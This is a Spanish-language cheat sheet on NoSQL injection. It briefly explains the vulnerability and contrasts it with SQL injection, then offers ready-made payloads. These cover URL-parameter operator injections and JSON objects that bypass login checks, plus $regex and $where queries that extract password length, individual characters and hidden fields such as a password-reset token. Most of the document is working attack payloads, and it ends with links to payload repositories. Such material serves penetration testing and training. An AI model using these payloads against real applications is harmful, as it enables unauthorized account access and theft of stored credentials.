---

### 💥 **NoSQL Injection Cheat Sheet** 💥

---
---
#### **¿Qué es una inyección NoSQL?**  

Las **inyecciones NoSQL** son vulnerabilidades de seguridad que afectan aplicaciones web que utilizan bases de datos NoSQL, como **MongoDB**, **Cassandra** y **CouchDB**.  
El atacante envía **datos maliciosos a través de una consulta** que se ejecuta sin validación o sanitización adecuada, logrando:  

- **Acceso no autorizado a información confidencial.**  
- **Modificación de datos** en la base de datos.  
- **Ejecución de acciones no deseadas** en el sistema.  

---

## **Diferencia entre SQLi y NoSQLi**  
| Aspecto               | SQL Injection                           | NoSQL Injection                        |
|-----------------------|-----------------------------------------|-----------------------------------------|
| Tipo de Base de Datos | Relacional (SQL)                         | No Relacional (NoSQL)                    |
| Lenguaje de Consulta  | SQL (Structured Query Language)          | MongoDB Query, JSON, u otros específicos |
| Vectores de Ataque    | Inyección en sentencias SQL              | Inyección en consultas basadas en objetos |
| Validación            | Explotación de sintaxis SQL              | Falta de validación en objetos JSON       |

---

### **Payloads para inyección NoSQL**

#### **Payloads en Parámetros (Data)**
```bash
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

#### **Payloads de Prueba (Testing)**
```bash
'
' + '
'%2b'
' && '1' == '2  # URL encoded
' && '1' == '1  # URL encoded
administrator' && this.password.length > 7 || 'a'=='b  # URL encoded
administrator' && this.password[0] == 'k' || 'a'=='b   # URL encoded
```

---

### **Payloads en JSON**

#### **Evasión de Restricciones**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

#### **Consultas Avanzadas**
##### **Comprobar longitud de la contraseña:**
```json
{
    "username": "admin",
    "password": {
        "$regex": ".{29}"  # Longitud de 29 caracteres
    }
}
```

##### **Verificar el primer carácter:**
```json
{
    "username": "admin",
    "password": {
        "$regex": "^a"  # Empieza con "a"
    }
}
```

##### **Identificar el campo `_id`:**
```json
{
    "username": "carlos",
    "password": {"$ne": ""},
    "$where": "function(){ if(Object.keys(this)[0].match('_id')) return 1; else 0; }"
}
```

##### **Longitud de un campo oculto:**
```json
{
    "username": "carlos",
    "password": {"$ne": ""},
    "$where": "function(){ if(this.changePwd.length == 1) return 1; else 0; }"
}
```

##### **Comprobar el carácter inicial del campo oculto:**
```json
{
    "username": "carlos",
    "password": {"$ne": ""},
    "$where": "function(){ if(this.changePwd.match(/^a/)) return 1; else 0; }"
}
```

---
### 🔗 **Recursos adicionales:**
- Repositorio de Payloads:  
  [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
  [NoSQLMap](https://github.com/codingo/NoSQLMap)
---
